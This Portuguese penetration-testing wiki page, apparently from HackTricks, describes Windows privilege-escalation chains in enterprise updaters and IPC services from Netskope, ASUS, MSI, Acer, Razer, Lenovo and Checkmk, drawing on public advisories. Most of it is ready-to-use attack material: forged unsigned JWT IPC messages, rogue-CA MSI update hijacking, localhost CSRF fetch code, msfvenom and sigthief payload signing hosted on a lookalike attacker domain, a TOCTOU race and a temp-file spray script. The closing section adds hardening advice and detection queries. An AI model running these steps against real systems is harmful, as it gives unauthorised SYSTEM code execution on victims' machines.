# Abusando de Enterprise Auto-Updaters e IPC privilegiado (por exemplo, Netskope, ASUS e MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de local privilege escalation no Windows encontradas em enterprise endpoint agents e updaters que expõem uma superfície de IPC de baixo atrito e um fluxo de atualização privilegiado. Um exemplo representativo é o Netskope Client para Windows < R129 (CVE-2025-0309), em que um usuário com poucos privilégios pode forçar o enrollment em um servidor controlado pelo atacante e, então, entregar um MSI malicioso que o serviço SYSTEM instala.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ideias importantes que você pode reutilizar contra produtos semelhantes:
- Abuse o IPC localhost de um serviço privilegiado para forçar um novo enrollment ou uma reconfiguração para um servidor controlado pelo atacante.
- Implemente os endpoints de atualização do vendor, entregue uma Trusted Root CA rogue e aponte o updater para um pacote malicioso “assinado”.
- Contorne verificações fracas do signer (allow-lists de CN), flags de digest opcionais e propriedades MSI permissivas.
- Se o IPC for “criptografado”, derive a key/IV a partir de identificadores da máquina legíveis por todos e armazenados no registry.
- Se o serviço restringir os callers pelo caminho da imagem/nome do processo, injete em um processo presente na allow-list ou inicie um processo suspenso e faça o bootstrap da sua DLL por meio de um patch mínimo no contexto do thread.

---
## 1) Forçando o enrollment em um servidor controlado pelo atacante via IPC localhost

Muitos agents incluem um processo de UI em user-mode que se comunica com um serviço SYSTEM por TCP localhost usando JSON.

Observado no Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Fluxo de exploração:
1) Crie um token JWT de enrollment cujas claims controlem o host do backend (por exemplo, AddonUrl). Use alg=None para que nenhuma assinatura seja necessária.
2) Envie a mensagem IPC que invoca o comando de provisioning com seu JWT e o nome do tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) O serviço começa a consultar seu servidor rogue para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Se a verificação do caller for baseada em path/nome, origine a solicitação a partir de um binário do vendor incluído na allowlist (consulte §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking do update channel para executar código como SYSTEM

Depois que o client se comunica com seu servidor, implemente os endpoints esperados e direcione-o para um MSI controlado pelo attacker. Sequência típica:

1) /v2/config/org/clientconfig → Retorne uma configuração JSON com um intervalo de atualização do updater muito curto, por exemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retorna um certificado CA PEM. O serviço o instala no armazenamento Trusted Root da Local Machine.
3) /v2/checkupdate → Forneça metadados apontando para um MSI malicioso e uma versão falsa.

Contornando verificações comuns observadas na prática:
- Allow-list de CN do signatário: o serviço pode verificar apenas se o Subject CN é igual a “netSkope Inc” ou “Netskope, Inc.”. Sua CA rogue pode emitir um leaf com esse CN e assinar o MSI.
- Propriedade CERT_DIGEST: inclua uma propriedade benigna de MSI chamada CERT_DIGEST. Não há enforcement durante a instalação.
- Enforcement opcional de digest: uma flag de configuração (por exemplo, check_msi_digest=false) desativa a validação criptográfica adicional.

Resultado: o serviço SYSTEM instala seu MSI a partir de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lição sobre bypass de patches: se um vendor responder permitindo apenas um pequeno conjunto de domínios “confiáveis” em vez de autenticar criptograficamente a origem da atualização, procure redirectors ou reverse proxies controlados pelo vendor que ainda permitam direcionar o tráfego. No caso da Netskope, pesquisas públicas posteriores mostraram que uma allow-list da era R129 ainda podia ser abusada por meio de `rproxy.goskope.com`, que fazia proxy de conteúdo controlado pelo atacante hospedado no Azure App Service. Considere allow-lists de hostnames como um obstáculo, não como uma trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Forjando requests IPC criptografados (quando presentes)

A partir da R127, a Netskope encapsulou o JSON IPC em um campo encryptData que se parece com Base64. A análise reversa mostrou AES com key/IV derivados de valores do registry legíveis por qualquer usuário:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atacantes podem reproduzir a criptografia e enviar comandos criptografados válidos a partir de um usuário padrão.<sup>[[1]](#references)[[2]](#references)</sup> Dica geral: se um agent de repente “criptografa” seu IPC, procure device IDs, product GUIDs e install IDs em HKLM que possam servir como material.

---
## 4) Contornando allow-lists de callers IPC (verificações de path/name)

Alguns serviços tentam autenticar o peer resolvendo o PID da conexão TCP e comparando o image path/name com vendor binaries incluídos em uma allow-list, localizados em Program Files (por exemplo, stagentui.exe, bwansvc.exe, epdlp.exe).

Dois bypasses práticos:
- DLL injection em um processo incluído na allow-list (por exemplo, nsdiag.exe) e fazer proxy do IPC de dentro dele.
- Iniciar um binary incluído na allow-list em estado suspended e inicializar sua proxy DLL sem CreateRemoteThread (consulte §5) para satisfazer as regras de tamper aplicadas pelo driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injeção compatível com tamper protection: processo suspenso + patch de NtContinue

Os produtos geralmente incluem um driver minifilter/OB callbacks (por exemplo, Stadrv) para remover direitos perigosos de handles para processos protegidos:
- Process: remove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Um loader user-mode confiável que respeita essas restrições:
1) Execute CreateProcess de um binary do vendor com CREATE_SUSPENDED.
2) Obtenha os handles ainda permitidos: PROCESS_VM_WRITE | PROCESS_VM_OPERATION no processo e um thread handle com THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou apenas THREAD_RESUME se você fizer patch do código em um RIP conhecido).
3) Sobrescreva ntdll!NtContinue (ou outro early thunk com mapeamento garantido) com um stub pequeno que chama LoadLibraryW no path da sua DLL e depois retorna ao fluxo original.
4) Execute ResumeThread para disparar seu stub dentro do processo e carregar sua DLL.

Como você nunca usou PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME em um processo já protegido (você o criou), a policy do driver é satisfeita.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Ferramentas práticas
- NachoVPN (plugin da Netskope) automatiza uma CA rogue, a assinatura de um MSI malicioso e disponibiliza os endpoints necessários: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope é um cliente IPC customizado que cria mensagens IPC arbitrárias (opcionalmente criptografadas com AES) e inclui a injeção em processo suspenso para originar a comunicação a partir de um binary incluído na allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow rápido de triage para superfícies desconhecidas de updater/IPC

Ao lidar com um endpoint agent novo ou uma suíte de “helper” de motherboard, um workflow rápido geralmente é suficiente para determinar se você está diante de um alvo promissor de privesc:<sup>[[6]](#references)</sup>

1) Enumere os listeners de loopback e associe-os aos processos do vendor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerar named pipes candidatos:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extraia dados de roteamento armazenados no registro usados por servidores IPC baseados em plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extraia primeiro os nomes dos endpoints, as chaves JSON e os IDs de comando do cliente em user-mode. Frontends empacotados em Electron/.NET frequentemente expõem todo o schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Procure o predicado de confiança real, não apenas o caminho de código que eventualmente inicia o processo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Padrões que vale a pena priorizar:
- `CryptQueryObject`/análise de certificados sem `WinVerifyTrust` geralmente significa que “o certificado existe” foi tratado como “o certificado é confiável”, permitindo clonagem de certificados ou outros truques de fake-signer.
- Verificações de substring/sufixo sobre `Origin`, `Referer`, URLs de download, nomes de processos ou CNs de signatários não são autenticação. `contains(".vendor.com")` geralmente é explorável com domínios lookalike controlados pelo atacante.
- Se a GUI de baixo privilégio decide que “o arquivo é confiável” e o broker SYSTEM apenas consome esse resultado, fazer patch ou reimplementar a DLL/JS do lado do cliente frequentemente ignora completamente essa fronteira (split validation no estilo Razer).
- Se o broker copia um payload para `%TEMP%`/`C:\Windows\Temp` e depois o valida ou agenda a partir desse caminho, teste imediatamente janelas de substituição TOCTOU e módulos de plugin irmãos que exponham wrappers `ExecuteTask()` alternativos com verificações mais fracas.<sup>[[6]](#references)</sup>

Para alvos com muitas named pipes, o PipeViewer é uma forma rápida de identificar DACLs fracas e pipes acessíveis remotamente antes de começar a fazer reversing profundo do protocolo.<sup>[[11]](#references)</sup>

Se o alvo autentica os callers apenas por PID, caminho da imagem ou nome do processo, trate isso como um obstáculo, não como uma fronteira: injetar no cliente legítimo ou fazer a conexão a partir de um processo allow-listed geralmente é suficiente para satisfazer as verificações do servidor. Especificamente para named pipes, [esta página sobre client impersonation e pipe abuse](named-pipe-client-impersonation.md) aborda o primitive em mais profundidade.

---
## 8) Brokers de add-ins modulares autenticados apenas por assinaturas do fornecedor (padrão Lenovo Vantage)

Uma variação mais recente que vale a pena investigar é o **broker RPC de cliente assinado**: um processo desktop Lenovo-signed de baixo privilégio se comunica com um serviço SYSTEM, e o serviço roteia comandos JSON para um conjunto de add-ins descritos por XML em `%ProgramData%`. Assim que a execução de código é obtida **dentro de qualquer cliente assinado aceito**, todo contrato `runas="system"` passa a fazer parte da sua attack surface.<sup>[[15]](#references)</sup>

Primitives de alto valor observados em pesquisas sobre o Lenovo Vantage:
- **Confiar no caller porque ele é assinado pelo fornecedor**: pesquisadores obtiveram um contexto autenticado copiando um EXE Lenovo-signed para um diretório gravável e satisfazendo um DLL side-load (`profapi.dll`), fazendo com que código arbitrário fosse executado dentro de um cliente que o serviço já confiava.
- **Descoberta da attack surface orientada por manifestos**: os add-ins são declarados em `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; vários contratos são executados como `SYSTEM`, portanto enumerar esses manifestos frequentemente revela os verbos privilegiados reais mais rapidamente do que fazer reversing do próprio broker.
- **Bugs por comando atrás do canal autenticado**: uma vez dentro do cliente confiável, pesquisas públicas encontraram path traversal + race conditions em verbos de update/install, abuso de raw-SQL em bancos de dados privilegiados de configurações e verificações de caminhos do registro baseadas em substring que permitiam gravações fora da hive pretendida.

Recon útil em um alvo:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Conclusão prática: sempre que uma helper suite expuser um broker que primeiro autentica o **caller process** e só então despacha para dezenas de comandos de plugin/add-in, não pare após contornar a verificação de confiança da porta de entrada. Extraia a tabela de manifest/contract e faça fuzz de cada verbo de alto privilégio independentemente; o canal autenticado geralmente oculta vários bugs de segunda etapa.

---
## 1) CSRF do navegador para localhost contra APIs HTTP privilegiadas (ASUS DriverHub)

O DriverHub fornece um serviço HTTP em modo de usuário (ADU.exe) em 127.0.0.1:53000 que espera chamadas do navegador provenientes de https://driverhub.asus.com. O filtro de origem simplesmente executa `string_contains(".asus.com")` sobre o cabeçalho Origin e sobre as URLs de download expostas por `/asus/v1.0/*`. Portanto, qualquer host controlado pelo atacante, como `https://driverhub.asus.com.attacker.tld`, passa pela verificação e pode emitir requisições que alteram o estado por meio de JavaScript.<sup>[[6]](#references)</sup> Consulte [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para obter padrões adicionais de bypass.

Fluxo prático:
1) Registre um domínio que contenha `.asus.com` e hospede nele uma página web maliciosa.
2) Use `fetch` ou XHR para chamar um endpoint privilegiado (por exemplo, `Reboot`, `UpdateApp`) em `http://127.0.0.1:53000`.
3) Envie o corpo JSON esperado pelo handler – o frontend JS empacotado mostra o schema abaixo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Até mesmo o PowerShell CLI mostrado abaixo funciona quando o header Origin é spoofado para o valor confiável:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualquer visita do navegador ao site do atacante, portanto, torna-se um CSRF local de 1 clique (ou de 0 cliques via `onload`) que aciona um helper executado como SYSTEM.

---
## 2) Verificação insegura de code-signing e clonagem de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` baixa executáveis arbitrários definidos no corpo JSON e os armazena em cache em `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. A validação da URL de download reutiliza a mesma lógica de substring, portanto `http://updates.asus.com.attacker.tld:8000/payload.exe` é aceita. Após o download, o ADU.exe apenas verifica se o PE contém uma assinatura e se a string Subject corresponde à ASUS antes de executá-lo – sem `WinVerifyTrust` e sem validação da cadeia de certificados.

Para weaponize o fluxo:
1) Crie um payload (por exemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone o signer da ASUS para ele (por exemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospede `pwn.exe` em um domínio semelhante a `.asus.com` e acione o UpdateApp por meio do CSRF do navegador acima.

Como os filtros de Origin e URL são baseados em substring e a verificação do signer apenas compara strings, o DriverHub baixa e executa o binário do atacante em seu contexto elevado.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU nos caminhos de cópia/execução do updater (MSI Center CMD_AutoUpdateSDK)

O serviço SYSTEM do MSI Center expõe um protocolo TCP no qual cada frame é `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. O componente principal (Component ID `0f 27 00 00`) inclui `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Seu handler:
1) Copia o executável fornecido para `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica a assinatura por meio de `CS_CommonAPI.EX_CA::Verify` (o subject do certificado deve ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve ser bem-sucedido).
3) Cria uma scheduled task que executa o arquivo temporário como SYSTEM com argumentos controlados pelo atacante.

O arquivo copiado não é bloqueado entre a verificação e `ExecuteTask()`. Um atacante pode:
- Enviar o Frame A apontando para um binário legítimo assinado pela MSI (garantindo que a verificação da assinatura seja aprovada e que a task seja enfileirada).
- Executar uma corrida com mensagens Frame B repetidas apontando para um payload malicioso, sobrescrevendo `MSI Center SDK.exe` logo após a conclusão da verificação.

Quando o scheduler é acionado, ele executa o payload sobrescrito como SYSTEM, apesar de ter validado o arquivo original. A exploração confiável usa duas goroutines/threads que enviam CMD_AutoUpdateSDK repetidamente até vencer a janela TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso de IPC personalizado em nível SYSTEM e impersonation (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP do MSI Center
- Cada plugin/DLL carregado pelo `MSI.CentralServer.exe` recebe um Component ID armazenado em `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Os primeiros 4 bytes de um frame selecionam esse componente, permitindo que atacantes encaminhem comandos para módulos arbitrários.
- Plugins podem definir seus próprios task runners. `Support\API_Support.dll` expõe `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chama diretamente `API_Support.EX_Task::ExecuteTask()` sem qualquer validação de assinatura – qualquer usuário local pode apontá-lo para `C:\Users\<user>\Desktop\payload.exe` e obter execução como SYSTEM de forma determinística.
- Capturar o loopback com o Wireshark ou instrumentar os binários .NET no dnSpy revela rapidamente o mapeamento entre Component e comando; clientes personalizados em Go/Python podem então reproduzir os frames.<sup>[[6]](#references)</sup>

### Named pipes e níveis de impersonation do Acer Control Centre
- O `ACCSvc.exe` (SYSTEM) expõe `\\.\pipe\treadstone_service_LightMode`, e sua ACL discricionária permite clientes remotos (por exemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Enviar o ID de comando `7` com um caminho de arquivo invoca a rotina de criação de processos do serviço.
- A biblioteca cliente serializa um byte terminador mágico (113) junto com os argumentos. A instrumentação dinâmica com Frida/`TsDotNetLib` (consulte [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para dicas de instrumentação) mostra que o handler nativo mapeia esse valor para um `SECURITY_IMPERSONATION_LEVEL` e um SID de integridade antes de chamar `CreateProcessAsUser`.
- Trocar 113 (`0x71`) por 114 (`0x72`) direciona a execução para o branch genérico, que mantém o token SYSTEM completo e define um SID de alta integridade (`S-1-16-12288`). Portanto, o binário criado é executado como SYSTEM sem restrições, tanto localmente quanto entre máquinas.
- Combine isso com a flag de installer exposta (`Setup.exe -nocheck`) para configurar o ACC até mesmo em lab VMs e testar o pipe sem hardware do vendor.<sup>[[6]](#references)</sup>

Esses bugs de IPC destacam por que serviços localhost devem aplicar mutual authentication (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) e por que o helper de cada módulo para “executar binário arbitrário” deve compartilhar as mesmas verificações de signer.

---
## 3) Helpers “elevators” de COM/IPC baseados em validação fraca no user-mode (Razer Synapse 4)

O Razer Synapse 4 adicionou outro padrão útil a essa família: um usuário com poucos privilégios pode solicitar a um helper COM que inicie um processo por meio do `RzUtility.Elevator`, enquanto a decisão de confiança é delegada a uma DLL no user-mode (`simple_service.dll`), em vez de ser aplicada de forma robusta dentro da boundary privilegiada.

Caminho de exploração observado:
- Instancie o objeto COM `RzUtility.Elevator`.
- Chame `LaunchProcessNoWait(<path>, "", 1)` para solicitar uma execução elevada.
- No PoC público, o gate de assinatura PE dentro de `simple_service.dll` é patched out antes de emitir a solicitação, permitindo que um executável arbitrário escolhido pelo atacante seja iniciado.<sup>[[6]](#references)</sup>

Invocação mínima em PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Conclusão geral: ao fazer reversing de suites de “helper”, não pare em TCP localhost ou named pipes. Verifique classes COM com nomes como `Elevator`, `Launcher`, `Updater` ou `Utility` e, em seguida, confirme se o serviço privilegiado realmente valida o binário-alvo ou se apenas confia em um resultado calculado por uma DLL cliente em user-mode que pode ser modificada. Esse padrão se generaliza para além do Razer: qualquer design dividido em que o broker de alto privilégio consome uma decisão de allow/deny do lado de baixo privilégio é um possível privesc surface.


---
## Execução previsível de script temporário durante o reparo de MSI (Checkmk Agent / CVE-2024-0670)

Alguns agentes do Windows ainda implementam ações privilegiadas gravando um `.cmd` temporário em `C:\Windows\Temp` e executando-o como `SYSTEM`. Se o nome do arquivo for previsível e o serviço não recriar arquivos existentes com segurança, um usuário com poucos privilégios poderá pré-criar o futuro arquivo temporário como **somente leitura** e fazer com que o processo privilegiado execute conteúdo controlado pelo atacante em vez do próprio script.

Observado em builds vulneráveis do Checkmk Agent:
- padrão temporário: `cmk_all_<PID>_1.cmd`
- branches afetadas: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: **repair** do MSI do pacote de agente em cache<sup>[[8]](#references)[[9]](#references)</sup>

Workflow prático:
1. Estime um intervalo realista de PID com base nos IDs dos processos atuais ou no PID do agente em execução.
2. Grave um payload `.cmd` curto em **ASCII** (`Set-Content -Encoding Ascii` ou redirecionamento do `cmd.exe`; evite a saída UTF-16 do PowerShell para arquivos batch).
3. Faça spray de `C:\Windows\Temp\cmk_all_<PID>_1.cmd` em todo o intervalo candidato e marque cada arquivo como somente leitura.
4. Trigger um **repair** do MSI em cache para que o serviço privilegiado tente regenerar e, em seguida, execute o script temporário.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Se o produto vulnerável estiver instalado com o Windows Installer, associe o MSI armazenado em cache, com aparência aleatória, em `C:\Windows\Installer` ao nome do produto antes de acionar o reparo:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Notas operacionais:
- `qwinsta` é útil quando `msiexec /fa` falha a partir de um shell WinRM não interativo e você precisa entender se uma sessão de desktop existente/desconectada pode acionar o reparo corretamente.<sup>[[7]](#references)</sup>
- Este padrão se generaliza para outros agentes de endpoint e updaters que **armazenam scripts temporários em locais com permissão de escrita para todos e posteriormente os executam como SYSTEM**. Teste nomes previsíveis, ausência de semântica de criação exclusiva e fluxos de reparo/atualização que podem ser acionados sob demanda.

---
## Hijack remoto da supply chain via validação fraca do updater (WinGUp / Notepad++)

Entre junho de 2025 e dezembro de 2025, attackers que comprometeram a infraestrutura de hospedagem por trás do fluxo de atualização do Notepad++ serviram seletivamente manifests maliciosos para vítimas escolhidas. Updaters mais antigos baseados em WinGUp não verificavam totalmente a autenticidade das atualizações, portanto uma resposta XML hostil podia redirecionar os clientes para URLs controladas pelo attacker. Como o cliente aceitava conteúdo HTTPS sem exigir uma cadeia de certificados confiável e uma assinatura PE válida no installer baixado, as vítimas baixavam e executavam um `update.exe` NSIS trojanizado.<sup>[[12]](#references)[[13]](#references)</sup>

Fluxo operacional (nenhum exploit local necessário):
1. **Interceptação da infraestrutura**: comprometer a CDN/hospedagem e responder às verificações de atualização com metadata do attacker apontando para uma URL de download maliciosa.
2. **NSIS trojanizado**: o installer baixa/executa um payload e abusa de duas cadeias de execução:
- **Bring-your-own signed binary + sideload**: incluir o `BluetoothService.exe` assinado da Bitdefender e inserir uma `log.dll` maliciosa em seu search path. Quando o binário assinado é executado, o Windows faz sideload da `log.dll`, que descriptografa e carrega reflexivamente o backdoor Chrysalis (protegido por Warbird + API hashing para dificultar a detecção estática).
- **Injeção de shellcode via script**: o NSIS executa um script Lua compilado que usa APIs Win32 (por exemplo, `EnumWindowStationsW`) para injetar shellcode e preparar o Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Principais medidas de hardening/detecção para qualquer auto-updater:
- Exija **verificação de certificado + assinatura** do installer baixado (fixe o signer do vendor, rejeite CN/cadeia incompatíveis) e assine o próprio update manifest (por exemplo, XMLDSig). Bloqueie redirects controlados pelo manifest, a menos que sejam validados.
- Trate o **sideload de binário assinado BYO** como um pivot de detecção pós-download: gere alertas quando um EXE de vendor assinado carregar um nome de DLL de fora de seu caminho canônico de instalação (por exemplo, a Bitdefender carregando `log.dll` de Temp/Downloads) e quando um updater gravar/executar installers a partir de diretórios temporários com assinaturas que não sejam do vendor.
- Monitore os **artefatos específicos do malware** observados nesta cadeia (úteis como pivots genéricos): mutex `Global\Jdhfv_1.0.1`, gravações anômalas de `gup.exe` em `%TEMP%` e etapas de injeção de shellcode orientadas por Lua.
- O Notepad++ respondeu fortalecendo o WinGUp na v8.8.9 e posteriores: o XML retornado agora é assinado (XMLDSig), e builds mais recentes exigem a verificação de certificado + assinatura do installer baixado em vez de confiar apenas no transporte.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload de EXE assinado pela Bitdefender com <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> iniciando um instalador que não seja do Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Esses padrões se aplicam a qualquer updater que aceite manifests não assinados ou não restrinja os signers do installer — hijack de rede + installer malicioso + sideloading assinado pelo atacante resultam em remote code execution sob o pretexto de updates “confiáveis”.

---
## Referências
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
